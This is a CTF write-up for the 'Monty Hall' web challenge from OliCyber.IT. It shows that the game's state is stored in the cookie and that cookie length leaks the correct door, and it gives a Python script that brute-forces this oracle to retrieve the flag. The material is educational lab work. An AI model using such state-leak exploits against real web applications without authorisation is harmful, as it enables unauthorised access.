# OliCyber.IT - Regional CTF

## [web] Monty Hall (16 solves)

Pokémon Platinum is the best one: [Turnback Cave](https://www.youtube.com/watch?v=rf8H4JTdy88)

Website: [http://monty-hall.challs.external.open.ecsc2024.it](http://monty-hall.challs.external.open.ecsc2024.it)

Author: Aleandro Prudenzano <@drw0if>

## Solution

The challenge presents 3 doors to the user, who can choose one of them by clicking on it. Analyzing the source code or the network tab in the browser, it is possible to notice that clicking on any of the 3 doors will trigger a form submission, with a different value for the field `choice`, depending on the chosen door. If we play with the game, clicking on random doors, we can notice that with each submission, the server provides a new cookie, sometimes longer and sometimes shorter.

By trying all the three doors with a fixed cookie as the starting point, we can observe that two of the choices produce a new cookie long as the old one, while one choice produces a longer new cookie. By looking at the source code, we notice that the state of the game is stored inside the cookie itself, and whenever the player clicks on the correct door, the door itself is added to the state (in a list of visited doors), generating a longer cookie.

We can therefore use the cookie length as an oracle to understand which door is the correct one at every crossroads, by keeping a fixed cookie and trying all the three choices, moving forward only when we obtain a longer new cookie.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import requests
import re

# For HTTP connection
URL = os.environ.get("URL", "http://monty-hall.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]


def make_request(session, choice):
    r = requests.post(URL, cookies={"session": session}, data={"choice": choice}, allow_redirects=False)
    return r.text, r.cookies['session']


def solve():
    # Get a token for the first level
    _, current_session = make_request("asd", 1)

    # Loop maximum 12 times
    for _ in range(12):
        # Try all three doors
        new_sessions = []
        for i in range(1, 4):
            content, new_session = make_request(current_session, i)

            # If flag found, print it and quit
            if "flag{" in content:
                res = re.findall(r"flag\{[a-zA-Z0-9_]*}", content)[0]
                print(res)
                return

            new_sessions.append(new_session)

        # Choose the longest session
        current_session = max(new_sessions, key=lambda x: len(x))


if __name__ == '__main__':
    solve()
```
